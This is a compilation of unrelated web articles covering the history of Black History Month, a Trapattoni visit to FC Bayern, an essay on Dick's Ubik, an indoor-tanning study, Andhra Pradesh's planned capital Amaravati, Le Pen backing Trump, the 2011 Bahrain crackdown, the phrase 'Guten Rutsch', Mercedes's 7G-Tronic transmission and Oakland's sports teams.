The precursor to Black History Month was created in 1926 in the United States, when historian Carter G. Woodson and the Association for the Study of Negro Life and History announced the second week of February to be "Negro History Week".[10] This week was chosen because it coincided with the birthday of Abraham Lincoln on February 12 and of Frederick Douglass on February 14, both of which dates black communities had celebrated together since the late 19th century.[10] Negro History Week was the center of the equation. The thought-process behind the week was never recorded, but scholars acknowledge two reasons for its birth: recognition and importance.[11] Woodson felt deeply that at least one week would allow for the general movement to become something annually celebrated. Also, after the ten year long haul to successfully complete his "Journal of Negro History", he realized the subject deserved to resonate with a greater audience.
From the event's initial phase, primary emphasis was placed on encouraging the coordinated teaching of the history of American blacks in the nation's public schools. The first Negro History Week was met with a lukewarm response, gaining the cooperation of the Departments of Education of the states of North Carolina, Delaware, and West Virginia as well as the city school administrations of Baltimore and Washington, D.C..[12] Despite this far from universal acceptance, the event was regarded by Woodson as "one of the most fortunate steps ever taken by the Association", and plans for a repeat of the event on an annual basis continued apace.[12]
At the time of Negro History Week's launch, Woodson contended that the teaching of black history was essential to ensure the physical and intellectual survival of the race within broader society:
If a race has no history, it has no worthwhile tradition, it becomes a negligible factor in the thought of the world, and it stands in danger of being exterminated. The American Indian left no continuous record. He did not appreciate the value of tradition; and where is he today? The Hebrew keenly appreciated the value of tradition, as is attested by the Bible itself. In spite of worldwide persecution, therefore, he is a great factor in our civilization.[13]
By 1929, The Journal of Negro History was able to note that with only two exceptions, officials with the State Departments of Educations of "every state with considerable Negro population" had made the event known to that state's teachers and distributed official literature associated with the event".[14] Churches also played a significant role in the distribution of literature in association with Negro History Week during this initial interval, with the mainstream and black press aiding in the publicity effort.[15]
Negro History Week was met with enthusiastic response; it prompted the creation of black history clubs, an increase in interest among teachers, and interest from progressive whites. Negro History Week grew in popularity throughout the following decades, with mayors across the United States endorsing it as a holiday.[10]
On February 21, 2016, 106-year Washington D.C. resident and school volunteer Virginia McLaurin visited the White House as part of Black History Month. When asked by the president why she was there, McLaurin said, "A black president. A black wife. And I'm here to celebrate black history. That's what I'm here for."[16]
United States: Black History Month (1970)
The Black United Students first Black culture center (Kuumba House) where many events of the first Black History Month celebration took place.
Black History Month was first proposed by black educators and the Black United Students at Kent State University in February 1969. The first celebration of Black History Month took place at Kent State one year later, from January 2, 1970 – February 28, 1970.[6]
Six years later, Black History Month was being celebrated all across the country in educational institutions, centers of Black culture and community centers, both great and small, when President Gerald Ford recognized Black History Month, during the celebration of the United States Bicentennial. He urged Americans to "seize the opportunity to honor the too-often neglected accomplishments of black Americans in every area of endeavor throughout our history".[17]
United Kingdom (1987)
Black History Month was first celebrated in the United Kingdom in 1987. It was organised through the leadership of Ghanaian analyst Akyaaba Addai-Sebo, who had served as a coordinator of special projects for the Greater London Council (GLC) and created a collaboration to get it underway.[18] It was first celebrated in London.[19]
Canada (1995)
In 1995, after a motion by politician Jean Augustine, representing the riding of Etobicoke—Lakeshore in Ontario, Canada's House of Commons officially recognized February as Black History Month and honored Black Canadians. In 2008, Senator Donald Oliver moved to have the Senate officially recognize Black History Month, which was unanimously approved.[7]
Republic of Ireland (2014)
In 2014 the Republic of Ireland became only the fourth country in the world to officially celebrate Black History Month. Ireland's Great Hunger Institute notes: “Black History Month Ireland was initiated in Cork in 2010. This location seems particularly appropriate as, in the nineteenth century, the city was a leading center of abolition, and the male and female anti-slavery societies welcomed a number of black abolitionists to lecture there, including Charles Lenox Remond and Frederick Douglass." [20]
Criticism
Universally, a reliable education system is consistently one of the most important pillars of society. Among that pillar, the existence of Black History Month has frequently been a topic of debate in the educational field. There's often an annual debate about the continued usefulness and fairness of a designated month dedicated to the history of one race. One concern is that the inclusion of black history will discredit the accuracy of history as well as exclude the crucial parts, and distract children from what really matters when they enter their desired careers.[21] Criticisms include questions over whether it is appropriate to confine the celebration of black history to one month, as opposed to integration of black history into the mainstream education the rest of the year. Another criticism is that contrary to the original inspiration for Black History Month, which was a desire to redress the manner in which American schools failed to represent black historical figures as anything other than slaves or colonial subjects, Black History Month reduces complex historical figures to overly simplified objects of hero worship. Other critics refer to the celebration as racist,[22] and that it's existence will do damage to the position of Europe and the United States in their places of world history.
Actor and director Morgan Freeman and actress Stacey Dash have criticized the concept of declaring only one month as Black History Month,[23][24]. Freeman noted, "I don't want a Black history month. Black history is American history."[25] Supporters argue Black History will integrate much needed cultural inclusion and promote a positive, accepting environment where students can correctly learn the history of a people in a primarily Caucasian single story.[26]

There were some marvelling faces when a man stepped out of a car and crossed the street to FC Bayern's Säbener Straße: none other than Giovanni Trapattoni. On Thursday, the former FCB coach (1994/95 and 1996-98) paid a visit to the German champions, with whom he won the Bundesliga and DFB Cup titles – for the first time since his departure 18 years ago.
Trap was astounded at how much Säbener Straße has changed in the meantime. Training pitches, the youth academy, the ServiceCentre… This and much more are new since his time at the club.
The 77-year-old was warmly greeted at the club by the current coach Carlo Ancelotti. “Now we can speak together in German,” suggested Trapattoni with a grin. However, the first and second Italian head coaches at FCB opted for their mother tongue to speak with chairman Karl-Heinz Rummenigge about the old days, FC Bayern and the city of Munich. Even Hermann Gerland said hello.
There are several parallels in the careers of Trapattoni and Ancelotti. Both were long-time players at AC Milan, both coached Milan, Juventus and Bayern. And both were/are 57 years old when they took over in Munich.
Trapattoni will be at the FC Bayern Erlebniswelt this evening to promote his book “Giovanni Trapattoni – I'm not finished yet”. Rummenigge already has a copy personally presented by Trapattoni.
The key to understanding the universe in Ubik is in the repeated references to the Tibetan Book of the Dead, which acts as the primary text to understand the concept of half-life in the story. The book is based mainly on the idea of intermediate stages in existence, all central to the Buddhist concept of life, death, and transcendence. These beliefs become valuable to the people in the future Dick envisions, who have engineered a very literal intermediate stage between life and death. But the ideas found in the Tibetan Book of the Dead, and related beliefs, extend far beyond this one concept in Ubik, but are present in almost every facet of it. The world is presented as a series of intermediate stages in existence, where life and physicality, death and the mind, intermingle and change state constantly. This all plays into Dick's usual wheelhouse of perception and reality, but adds a spiritual bent to it.
Right off the hop, we are told that the boundaries between lives has been irreversibly altered by the existence of telepaths, represented by Ray Hollis, and the prudence organizations, represented by Glen Runciter – the basic concepts of personal privacy and even the mind itself are now dubious, as people live in constant awareness that someone, somewhere, can read their thoughts (or, in the case of Pat, alter reality itself). But the reality where minds intermingle via telepathy is really no different than the sort of floating cloud existence present in the moratoriums, where the weakened remnants of the minds (which in that context are presented as synonymous with the idea of a soul) co-habitate some invisible space, which of course causes frustration for those trying to speak to the half-lifers (like Glen Runciter does, repeatedly.) This may provide an explanation for why it took the characters so long to realize that they were now in half-life – it is largely the same, at least in their basic interactions with the world. Our very basic understanding of reality, then, is initially distorted, which plays into the book's later delving into stages of existence, which are based entirely on the mind/soul on its own. This also plays into the zinger ending, which forces the reader to question every level of reality they thought they understood, as it shows all levels of reality intermingling.
The concept of karma, central to Buddhism, is not explicitly mentioned in the book, but it apparently exists in it – which explains why Ella Runciter, ringleader of the angelic forces attempting to protect the half-lifers from the demonic Jory, is set to be reincarnated. With that, we can see that this follows the cyclical nature of existence, with rebirth seen as a sort of reward, even if it only continues that cycle. It is certainly seen as preferable to the existence of Joe Chip, forced to fend off decay (which acts as a visual representation of “real” death), and Jory, who clings on to his intermediate existence by bringing on the decay in others. There are definitely Western religious overtones in the book, this primacy of existence being one of them, but the idea of escaping this form of “immortality” subverts it somewhat – the desired destiny of a virtuous human usually is to be rewarded with such a state, by Dick portrays it as a hellish realm where death is even more of an omnipresent threat. This mixture of western and eastern philosophies is, once again, foretold by the references to the Tibetan Book of the Dead early on.
Focusing on the eastern religions for a bit, one concept I found particularly interesting when seen in conjunction with Ubik is the preta, or hungry ghost. These beings exist at the extremes of physical desires due to their karma in their previous life, which in some ways could be considered the ultimate ironic lesson in philosophy of rejecting material matters. All of Runciter's psychics, as well as Jory, could be described as being in this “hungry” state of existence – always seeking some form of reality, but finding it always out of reach. This can be seen in the frequent imagery of food (and more importantly for Joe Chip, cigarettes) rotting away before them, which also serves to demonstrate the haphazard way the “false” reality of half-life is constructed, falling away and reverting and never being able to maintain form. The agonizing “rotting” deaths of the psychics also corresponds to the description of the pretas as being corpse-like. Jory, in his “hungry ghost” stage, has become a menace, his hunger being for continued existence which he is able to maintain by devouring other souls in half-life. We can see this as having a karmic angle to it as well – he is only able to do this because his family abuses their wealth to keep his destruction quiet – and it serves as an effective punishment as well – after all, how can an eternal life in the intermediate realm be preferable to the continuing of the cycle as seen in Ella's rebirth? Both of these, in a way, seem to be based in maintaining a material existence, but one is doing so through selfish, entirely material means and the other through spiritual ones.
The way Dick fuses science fiction concepts with spirituality is a fascinating read, although it may not be immediately evident until the later in the book. The use of psychics at first forces to question reality and the characters' perception, but things get much more complicated very quickly as we see how they relate to the multiple levels of reality and the stages between life and death, which were also foretold by those references to the Tibetan Book of the Dead. In a way, it almost seems like a red herring – the psychics and anti-psychics prove to be no more in control of reality than the normal folks trapped in half-life, but they do provide an effective bridge from the science fiction view of reality to a more religious one, as the ideas of mind and soul gradually become one.

Health officials have often preached about the dangers of indoor tanning. However, a recent study may show just how detrimental the ultraviolet light exposure can be, particularly when looking at other negative habits. A recent study, in fact, suggests that indoor tanning may result in a higher number of cancer cases than smoking alone.
"What we knew is that indoor tanning is linked to skin cancer," Dr. Eleni Linos, the senior author of the study and a dermatologist at the University of California, San Francisco, said, via a press release. "What we wanted to find out is how common is exposure in the United States and internationally."
For the study, researchers examined data that was gathered between 1986 and 2012. They compiled information from 88 studies that included nearly 500,000 people in the United States, Australia and 14 other nations in Eastern and Western Europe.
The research showed that nearly 36 percent of the adults stated that they had used a tanning booth before, with up to 55 percent of them being college students. As for teenagers, the rate was 20 percent. Approximately 14 percent of adults said they had used indoor tanning within the past year. Women across all age groups were also more likely than men to participate in tanning.
Through examination of cancer rates, researchers found that every year, there was an estimated 419,000 cases of basal and squamous cell carcinomas, with around 11,000 cases of melanoma that could potentially be linked to indoor tanning. These numbers exceed those estimated to have caused lung cases due to smoking.
According to the authors, smoking causes around 363,000 cases of lung cancer per year.
The authors concluded, according to CBS Houston, "It is time to open the debate about and pursue additional research into appropriate and effective policy and prevention strategies with the potential to significantly reduce skin cancer risks."

Hyderabad: Hyderabad was all of 50 years old when 17th century French traveller and merchant Jean-Baptiste Tavernier marvelled at its wide boulevards and bridges, during one of his several voyages to India. Built on the banks of the Musi river by the Qutub Shahi dynasty, Hyderabad had a majestic city centre with a thriving bazaar.
Four hundred years later and 290km away, another Deccan dream is rising in the fertile plains of Andhra Pradesh, along the banks of the Krishna river: Amaravati.
The pet project of chief minister N. Chandrababu Naidu, Andhra Pradesh's designated capital spanning 7,420 sq. km, is 10 times the size of Singapore, or closer home, six times bigger than Chennai. A master plan prepared by the Singapore government envisages Amaravati as a modern megapolis—towering structures, glass facades, a central boulevard, wide avenues and footpaths, metro and riverway transport, and walkways along a 35km promenade.
Coming up between Vijayawada and Guntur towns in central Andhra Pradesh, Amaravati will be the newest state capital in the country. It is the fifth planned capital in independent India after Gandhinagar, Chandigarh, Bhubaneswar and Naya Raipur. The capital, if it indeed shapes up the way it's visualized, will stand tall among the best cities in India, and probably the world.

In the words of Naidu, “We have built capital cities in India but there are no world-class cities. We want to create a world-class city, a smart city in true spirit... The world should talk about our capital."
Will it happen? Or is Naidu conjuring up a utopian dream?
After Hyderabad became part of Telangana, which was carved out as India's 29th state in June 2014, building a new capital for the residuary state became the number one priority for Naidu, whose Telugu Desam Party came to power in Andhra Pradesh in elections that preceded its formal bifurcation.
To be sure, Andhra Pradesh has time until 2024 to build its capital. Till that time, Hyderabad will serve as the joint capital of Telangana and Andhra Pradesh.
But Naidu is wasting no time. He knows that he needs to show progress on the ground before the 2019 elections and is aiming to finish the first phase of construction of the new capital one year ahead. That is three years after the foundation stone for Amaravati are laid on Thursday, 22 October.
Land acquisition
The state government has managed to gain consent from the majority of the landowners on whose land the new capital will be built.
To sidestep the tedious provisions of the Land Acquisition Act, 2013, which would have made the cost of acquiring land prohibitively expensive for revenue-deficit Andhra Pradesh, the state government initiated the largest ever land pooling exercise in the country.
The capital region development authority (CRDA), a body set up to plan, co-ordinate, execute, finance and promote Amaravati, took control of almost 33,000 acres from farmers who, in turn, will receive plots in the developed capital. Depending on the type of land holding, landowners will receive a residential plot measuring 800-1,000 square yards and commercial plots of 100-450 square yards.
While the capital is being built, farmers who parted with their land under the land pooling scheme will be paid an annual compensation for 10 years. The compensation would increase 10% (of the original amount) every year.
Dryland owners are eligible for ₹ 30,000 per acre in the first year. Wetland owners will get ₹ 50,000 per acre. In the second year, the compensation for dryland owners will rise to ₹ 33,000 while in the third year, it would be ₹ 36,000.
Not surprisingly, the land pooling scheme received good response from farmers because of the generous compensation scheme and the prospect of capital appreciation on promised plots.
An urban utopia
The development plan is ambitious. Expressways and semi-expressways of 127km will run across the capital city out of a total road network of 938km.
The master plan, developed by urban planning consultancies Jurong International Holdings Pte. Ltd and Surbana International Consultants Pte. Ltd, envisages a bus rapid transit system, which can eventually be upgraded to a mass rapid transit network with four lines, spanning 135km.
The plan also provides for a greenfield airport. Till the time it's built, Amaravati's flying needs will be met by an existing airstrip at Gannavaram, 55km away.
The state expects $30 billion in investments over the next decade, according to Parakala Prabhakar, communications adviser to the Andhra Pradesh government. Infrastructure projects proposed in the master plan will require $16.5 billion, or around ₹ 1 trillion, of investment, according to one estimate.
Challenges and opportunities
Amaravati faces some major challenges. First is scale.
An expressway or infrastructure project needs a certain level of traffic to be viable. The government was smart not to build the capital in an isolated area.
By locating the capital between Vijayawada (12km away) and Guntur (20km), it can assure developers of traffic movement not only between these two towns but also other districts of Andhra Pradesh as Amaravati shapes up.
The region encompassing Vijayawada, Andhra Pradesh's trading and business hub, and Guntur would act as feeder towns for the new capital, urban planner Maheep Singh Thapar said. Besides, as the government prepares to relocate its offices from Hyderabad, a sizeable number of government staff (and their families) will move to the capital region over the coming years, assuring developers of some scale in traffic.
But will it be sufficient to ensure economic viability of the proposed infrastructure projects? “Most planned city developments in the past have not achieved expected densities as per plan, even though the infrastructure planning and implementation was in place," Srivatsa Anchan, partner and leader-capital projects advisory services at consulting firm EY, said.
The most famous example is of Naypyidaw, Myanmar's capital built from scratch. A Guardian feature in January 2015 showed a desolate city with wide roads and golf courses.
The second concern is of fiscal manoeuvrability.
Depending on the site conditions and requirements, a single-lane national highway can cost around ₹ 3-5 crore per km. To build 127km of four lane expressways, in each direction, the cost can be upwards of ₹ 3,000 crore. Apart from these, it has to build arterial roads, and other urban amenities such as government buildings, state housing, drinking water and sewage network, electricity transmission lines, bunds and hospitals.
Funding challenge
With the state already strapped for funds, the government is relying on a master developer to bring in investments through the public private partnership (PPP) mode.
However, considering the long gestation periods and uncertain financial viability of urban projects, experts wonder if private developers will be enthused. The limited success PPPs have seen at the state level too might deter private participation. Users are often reluctant to pay toll fee in road projects. Toll payments is a politically sensitive issue and there is often resistance from the locals.
“The challenge is funds," observed Venkataraman Rajaraman, director, India Ratings and Research Pvt. Ltd. “The existing state finances cannot support huge outlay for roads. Alternatively, it would be difficult to build roads on a toll-charges basis as tolls as the state level did not achieve much success."
Can Amaravati attract institutional investments? With not a brick laid yet, land values already hover around the prices of Hyderabad (which has solid infrastructure compared with Amaravati's zero infrastructure today), making economic activity in Amaravati unfeasible. That's because of a flood of speculative capital.
“What will be the key economic driver apart from the government offices will be the most critical thing," said Veera Babu, who oversees Hyderabad operations for real estate consulting firm Cushman and Wakefield. “Why will IT company go there if real estate cost is higher than Hyderabad? That's detrimental."
One challenge to Amaravati is Naidu himself.
For the capital city to take shape the way its planners have imagined, the project shouldn't be entangled in power struggles. Opposition leader Y.S. Jagan Mohan Reddy is boycotting the foundation ceremony after calling the capital a real estate-driven project. The state government doesn't have the opposition's support for the project.
In these circumstances, Naidu has to return to power at least in the 2019 state elections if his pet project has to take shape. “Mr Naidu has come to power continuously for the next two terms to make this a reality," said Babu.
It takes 5-15 years to build a decent-sized livable city. After all, Cyberabad in the suburbs of Hyderabad took 15 years to emerge as the IT hub and economic engine of the city, points out Thapar. “But, of course, it had the advantage of Hyderabad city as a proximal mother city."
DONALD TRUMP'S CAMPAIGN has garnered another high-profile supporter.
This time it is one of the big names in European right-wing politics, Jean-Marie Le Pen.
Le Pen is founder of France's National Front and father of the party's current president Marine Le Pen.
Tweeting yesterday, the 87-year-old stated that if he were American “I would vote Donald Trump”.
The tweet has since been retweeted more than 1,400 times.
Le Pen has previously found himself engulfed in controversy for making statements that constituted Holocaust denial and for saying that the Ebola virus could be the answer to the global “population explosion”.
The right-winger came to prominence in France during the 2002 Presidential election when he made it to the second-round of voting, facing off against Jacques Chirac.

This comes as part of a flurry of high-profile names that have backed Trump in recent days.
In a surprise move, former candidate for the Republican nomination and New Jersey Governor Chris Christie gave his backing to the candidate, saying he believed him to be the only Republican capable of beating Hillary Clinton.
Trump has also received the endorsement of former Ku Klux Klan grand wizard David Duke, which he was slow to distance himself from when asked about earlier today.
Media playback is unsupported on your device Media caption 'Braving the bullets' in Bahrain
The UN human rights chief has condemned the "shocking" use of force by security forces against protesters in Bahrain.
Navi Pillay said reports of a military takeover of hospitals was a blatant violation of international law.
She urged the authorities to rein in their forces, citing reports of people being beaten and detained or killed.
At least six opposition figures have reportedly been detained in overnight raids in Bahrain, and soldiers are back on the streets of the capital, Manama.
A crackdown on anti-government protesters in the city's centre left at least three civilians and three police officers dead on Wednesday.
Riot police sealed off Manama's main hospital and some smaller health centres, and rights activists said medics were being beaten as they tried to help the wounded in the streets.
"There are reports of arbitrary arrests, killings, beatings of protesters and of medical personnel, and of the takeover of hospitals and medical centres by various security forces," Ms Pillay, the UN High Commissioner for Human Rights, wrote in a statement released on Thursday.
"This is shocking and illegal conduct."
Earlier, the government said it had taken over the hospital because it had become a stronghold of the opposition.
Arrests
The protesters, mostly from the majority Shia population, say the violence will not deter them from challenging Bahrain's Sunni rulers.
The BBC's Caroline Hawley, in Manama, says the streets are calm, but extremely tense, with soldiers patrolling after an overnight curfew.
Mid-East unrest: Bahrain King Hamad, 61, has been in power since 1999
Population 800,000; land area 717 sq km, or 100 times smaller than Irish Republic
A population with a median age of 30.4 years, and a literacy rate of 91%
Youth unemployment at 19.6%
Gross national income per head: $25,420 (World Bank 2009) Protests: Country by country Bahraini views on the Gulf forces Bangladeshis 'bullied' in Bahrain
Right groups said riot police had fired tear gas on Thursday to disperse small protests in the Shia village of Daih, west of the capital, which is a key opposition area.
They said roads to the nearby villages of Sanabis and Jidhafs were blocked by military vehicles.
A military statement read out on state television said "leaders of the civil strife" had been arrested for communicating with foreign countries and calling for the fall of the regime.
It did not say how many opposition figures had been arrested, nor did it name them.
Opposition groups and rights activists said the arrested men include Hassan Mushaima and Abdeljalil al-Singace from the Haq party, who had been on trial for attempting to overthrow the leadership, although charges were dropped in a bid to calm tensions when unrest began.
More moderate protesters are calling for a constitutional monarchy, resignation of the government and an end to repression and corruption. However, the Haq party wants to set up a republic.
Shia activist Abdel Wahhab Hussein and Ibrahim Sharif, who leads a secularist Sunni party, were also detained.
'Guns pointed'
Matar Ibrahim, a former opposition MP from Bahrain's Shia majority, who recently resigned in protest at the crackdown, told the BBC the government was completely ignoring the message from the US that it was on the wrong track.
The US State Department has also criticised the use of excessive force and Secretary of State Hillary Clinton has called for dialogue.
Mr Ibrahim told the BBC: "We refuse to enter a dialogue while there are guns pointed at our heads."
Bahrain - which has a population of 800,000 and is home to the US Navy's Fifth Fleet - has been thrown into turmoil by the wave of unrest sweeping the Arab world. Protests began there last month.
On Tuesday King Hamad Bin Isa al-Khalifa declared a three-month state of emergency and Saudi troops were called in to keep order.
The following day troops moved in at dawn, backed by tanks and helicopters, to clear the central Pearl Square, where protesters had been camped for several weeks.
The crackdown has prompted sympathy protests from Shias in the region, including in Iran and Lebanon, where a few hundred people staged rallies denouncing the Bahraini and Saudi authorities.
Iran has withdrawn its ambassador to Bahrain, Mahdi Aghajafrari, in protest at the killing of anti-government protesters in Manama.
On Tuesday, the Bahraini ambassador in Tehran withdrew after Iran condemned the arrival of Saudi forces in Bahrain.
Bahrain's Sunni monarchy is closely allied to Saudi Arabia. It has long suspected Iran of encouraging the protesters, who are mostly from the Shia majority.
When your German friends wish you a “Guten Rutsch!”, “Einen Guten Rutsch ins neue Jahr!” or say “rutsch guet übere” (Swissgerman), they don't want you to “slide” or “slip” (rutschen=to slide; (aus)rutschen= to slip). They simply wish you a smooth start into the New Year.
Can't they just say “Gutes Neues Jahr”? Yes, they can and they do. But it's common that we wish a “guten Rutsch” to eachother.
Where does this expression come from? Is it somehow related to the fact that this time of the year people did “slide” into the snow (or on the ice)?
Since 1900 people wish “guten Rutsch”. Some think that “Rutsch” comes from the Rotwelsch language, a substratum of German “containing numerous words from other languages, notably from various German dialects, including Yiddish, as well as from Romany languages, notably Sintitikes“. But it is not very clear if the expression “Rosch ha schono” is Jiddish or Rotwelsch (cfr. Adolf Friedrich Thiele). Anyways, this expression seems to originate from the Hebraic ראש השנה טוב – Rosch ha schana tov, which means “a happy head/beginning of the year”, as the Jiddish “rosch” means “Head” since the 18th century.
There is an other fact to consider: the Jewish Newyear doesn't coincide with the Christian one and the Jiddish expression for the Jewish and Christian holidays differ.
Carl Wilhelm Friedrich points out that the Christian New Year is called schone chadosche (lit. new year), whereas the Jewish New Year is called rosch haschone (lit. beginning of the year). Johann Heinrich Callenberg testifies in his Jüdischteutschen Wörterbüchlein (Halle 1736), that the New Year's calling for Christians is schone chadosche (lit. that God may provide you a good New Year), and Walter Röll wonders how this schone chadosche that Jews would wish their Christian friends became a “guter Rutsch” also among Christians.
The fact that neither the Grimm brothers didn't mention the expression “Guten Rutsch” in their Deutsches Wörterbuch, nor Daniel Sanders in his Wörterbuch der deutschen Sprache (Leipzig 1876) indicate that this expression entered into the German language around 1900, probably through postcards which started to circulate around 1890/1895. After 1900 the market of openly and commercially sended New Years greetings mushroomed (cfr. Simon Neuberg & Walter Röll 2002).
Rutsch
In the German dictionary or Deutsches Wörterbuch from the brothers Grimm, “rutschen” has the meaning of sliding: “gleitend bewegen” (gliding), “freiwilliges und unfreiwilliges Gleiten”, “kriechen” (creep, crowl) but it's also attested in the expression “da rutscht' ich fort” and “Sonntag rutscht man auf das land” cfr. Johann Wolfgang von Goethe, as well as in the lemma “anrutschen” in “ich werd nächstens bei dir angerutscht kommen”, a more humorous way to express the “travelling” and “riding”.
Johann Andreas Schmeller gives another evidence for this figurative meaning in his Bayerisches Wörterbuch from 1836, where you'll find under rutschen among others “Irgend wohin rutschen, im Scherz: fahren. An Feyertagen rutscht das lebsüchtige München gerne auf Bering oder ins Hesselloh”.
In Grimms Wörterbuch, the feminine form “die Rutsche” (the slide) occurs in the phrase “glückliche rutsch” with the meaning “travel”, “journey”. Heinz Küpper attests the form since 1800 and confirms its use in “auf Rutsch gehen” (go on a travel/journey) for the 19th century.
The masculine form “der Rutsch” is attested in the phrase “guten (glücklichen) Rutsch” for “safe travel” since 1820. – Since the 19th century, “der Rutsch” stands for a short travel distance, where the verb “rutschen” (lit. gliding) originally referred to the gliding of the sledge (in the Winter) and later to the rail ride. Küpper assumes that the wish for a “guten Rutsch ins neue Jahr” suggests a good transition into the New Year, a effortless slide into the New Year, like on a sledge. And Lutz Röhrich says that the underlying idea is the slow, almost imperceptible sliding that is also expressed in the common short version of “Komm gut rüber!”
And here is an explanation for children (and adults) about the meaning of “Rutsch” today (from “Die Sendung mit der Maus”; © WDR VideoPodcast 27.12.2009):
Along these lines I wish you all “einen Guten Rutsch ins Neue Jahr 2014!

7G-Tronic (coded 722.9) is Mercedes-Benz's trademark name for its seven-speed automatic transmission. This fifth-generation transmission was introduced in the Autumn of 2003 on 8-cylinder models, and was the first seven-speed automatic transmission ever used on a production passenger vehicle.[1]
The 7G-Tronic initially debuted on five different eight-cylinder models: the E500, S430, S500, CL500, and SL500. It also soon became available on many six-cylinder models. Turbocharged V12 engines, four cylinder applications and commercial vehicles continued to use the older Mercedes-Benz 5G-Tronic transmission for many years.
The company claims that the 7G-Tronic is more fuel efficient and has shorter acceleration times and quicker intermediate sprints than the outgoing 5-speed automatic transmission.[1]
The 7G-Tronic has two reverse gear ratios: 3.416 and 2.231. The winter mode, also recently named 'comfort' mode, starts out in 2nd forward and 2nd reverse.
The transmission can skip gears when downshifting. It also has a lockup torque converter on all seven gears, allowing better transmission of torque for improved acceleration. The transmission's case is made of magnesium, a first for the industry, to save weight.[citation needed]
The 7G-Tronic is the fifth-generation transmission for Mercedes-Benz. About 65 percent of Mercedes-Benz C-Class sedans, wagons, and sport coupes are purchased with automatic transmissions (with that figure rising). However, about 88 percent of Mercedes-Benz E-Class sedans and wagons are purchased with automatic transmissions, and automatic transmissions are standard on the Mercedes-Benz S-Class.
The 7G-Tronic transmission is built at the Mercedes-Benz Stuttgart-Untertuerkheim plant in Germany, the site of Daimler-Benz's original production facility.
The transmission is currently available on the SsangYong's vehicles like Rexton, and Korando Turismo (in South Korea)/Turismo (in UK).
In July 2009, Mercedes-Benz announced they are working on a new nine-speed automatic.[2]
AMG SpeedShift MCT [ edit ]
Mercedes-AMG developed the 7-speed MCT "Multi Clutch Technology" planetary semi-automatic transmission.
The MCT transmission is essentially the 7G-Tronic automatic transmission without a torque converter. Instead of a torque converter, it uses a compact wet startup clutch to launch the car from a stop, and also supports computer-controlled double declutching. The MCT (Multi-Clutch Technology) acronym refers to a planetary (automatic) transmission's multiple clutches and bands for each gear.[3]
The MCT is fitted with four drive modes: “C” (Comfort), “S” (Sport), “S+” (Sport plus) and “M” (Manual) and boasts 100-millisecond shifts in "M" and "S+" modes. MCT-equipped cars are also fitted with the new AMG DRIVE UNIT with innovative Race Start function. The AMG DRIVE UNIT is the central control unit for the AMG SPEEDSHIFT MCT 7-speed sports transmission and all driving dynamics functions. The driver can change gears either using the selector lever, or by nudging the steering-wheel shift paddles. The new Race start Function is a launch control system which enables the driver to call on maximum acceleration, while ensuring optimum traction of the driven wheels.
It is available on the 2009 SL 63 AMG and E63 AMG, and will be used for the 2011 S63 AMG and CL63 AMG, and the 2012 CLS63 AMG and C63 AMG.

OAKLAND, Calif — To walk through this town — "The Town" — is to be engulfed by blue and yellow. You can't take two steps without running into something — a hat, a mural, a banner, a bus — that reminds you that you're in the home of the Golden State Warriors.
For the last 18 months, as the Warriors have completed their amazing metamorphosis from one of the NBA's laughingstock franchises into arguably the best team in all of professional sports, Oakland has been Dubs crazy.
And why shouldn't it be?
Article continues below ...
The Warriors might be the Bay Area's NBA team, but the team unquestionably belongs to Oakland, where the franchise has played its games for 43 of the last 44 years.
With all this attention surrounding the Warriors, Oakland isn't all that keen to share the team it supported through sporadic good times and the more frequent and much longer doldrums. The Warriors' success is felt in San Jose and San Francisco and everywhere in between, but the feeling is stronger in Oakland and the East Bay.
There's a bond between this city — a diverse, blue-collar town that was once the epicenter of the Black Power movement — and its basketball team, which, much like the city, has been on a tremendous upswing in recent years.
That bond isn't permanent though. The Warriors are planning to leave East Oakland's Oracle Arena — the NBA's oldest venue — and move across the bay to San Francisco and a new, state-of-the-art facility near the water in the coming years.
The Oakland Raiders and A's might be following them out of The Town soon thereafter. The Raiders haven't made a secret out of their search to move to a city that would give them a new stadium on the cheap, and the A's have an out clause in their lease with the city that would allow them to leave the cavernous and antiquated Oakland-Alameda County Coliseum in 2018.
There's deep irony to Oakland's professional sports predicament. Oakland is now the Bay Area's latest boomtown, and yet it could lose three of its most recognizable companies.
Oakland — long maligned as one of the most dangerous cities in America, and according to one presidential candidate, the world — is the new high tide of Silicon Valley — the home of Pandora and soon 2,500 Uber employees.
In the same way San Francisco took on young tech professionals looking to escape the high rents of San Jose and the Valley, Oakland has become the affordable and hip solution for those feeling the crunch from "The City," where a two-bedroom apartment now rents for an average of $5,000 a month and is increasing in price at roughly 15 percent annually (a slowdown.)
Property values have doubled in Oakland in last five years, tech employment is increasing at a rate as high as 10 percent annually, and Oakland is attracting major tech corporations to set up shop in the East Bay.
All the while, it's repelling three sports franchises worth a combined $3.5 billion.
All three of Oakland's teams play alongside Interstate 880 in East Oakland. The Oakland-Alameda County Coliseum was opened in 1966 and has been the home of the Raiders and A's for the better part of the last 50 years. The next-door Coliseum Arena, now called Oracle Arena, opened in the same year.
Both facilities, owned jointly by the city of Oakland and Alameda County, received much-needed renovations, costing a combined $321 million in 1995 and 1996.
The renovations were enough to entice the Raiders to return to Oakland after a 12-year stay in Los Angeles.
But 20 years later, those renovations are no longer enough — all three teams want new facilities — and Oakland, despite its new boom economy, doesn't have enough to pay for new arenas.
Even if the city did have the cash, they wouldn't use it on new buildings. According to Oakland's most recent budget, it and Alameda County still have outstanding obligations of $89 million for those now-antiquated renovations from the 1990's.
The political leanings of the region don't help the team's cases for new, publicly funded stadiums either. The San Francisco Giants attempted to secure public funding for a new stadium for the better part of two decades — at one point coming up only 2,000 votes short — but eventually built their current home, AT&T Park, with private funds in 1999.
The 49ers thought they could secure the public funding the Giants didn't. They found it 40 miles south of The City in suburban San Jose. The construction of Levi's Stadium included $114 million in public funds and nearly $1 billion in loans taken out by a shell corporation set up by the city of Santa Clara.
The landscape remains so toxic towards public funds for stadiums that the Warriors didn't even bother asking if Oakland would help build the franchise a new, state-of-the-art arena.
The Warriors wanted to move to San Francisco, in part to increase accessibility and comfort for the high-roller clientele from The City and Silicon Valley the team has acquired in its rise, and in part to cash in on the city's worldwide recognition by building the arena it lacks. The Warriors might play in Oakland, but on nationally televised games, those back-from-commercial shots around the town are usually of cable cars and the Golden Gate Bridge. Visiting teams don't even stay in Oakland. It's hardly a rare occurrence for Warriors' opponents to miss pregame shootarounds because the team bus was stuck in traffic on the Bay Bridge. Oakland might be on the up, but it'll always be San Francisco's ugly little brother.
